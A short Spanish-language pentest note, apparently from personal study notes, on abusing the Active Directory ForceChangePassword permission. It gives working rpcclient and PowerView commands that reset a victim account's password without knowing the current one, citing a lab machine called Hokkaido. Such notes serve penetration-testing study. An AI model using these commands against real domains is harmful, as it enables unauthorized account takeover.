---
title: Force Password Change
tags: [ad, acl, rpc, password-change]
---

# Force Password Change

> [!tip] Cuándo usarlo
> Cuando tu usuario (o un grupo al que pertenece) tiene el permiso **ForceChangePassword** sobre otra cuenta de usuario. Permite cambiarle la contraseña sin conocer la actual.

## Explotación via RPC

```bash
# Conectarse al DC via rpcclient
rpcclient -U 'domain/usuario%password' <IP_DC>

# Cambiar contraseña de la víctima
setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

## Caso práctico: Hokkaido
En la máquina Hokkaido se cambia la contraseña de Molly a través de RPC después de descubrir que el Grupo `tier2 admins` tiene ForceChangePassword sobre Molly.

## Alternativa con PowerView

```powershell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity molly.smith -AccountPassword $NewPassword
```

## Ver también
- [[Generic Write Sobre Usuario]]
- [[GenericAll DC]]
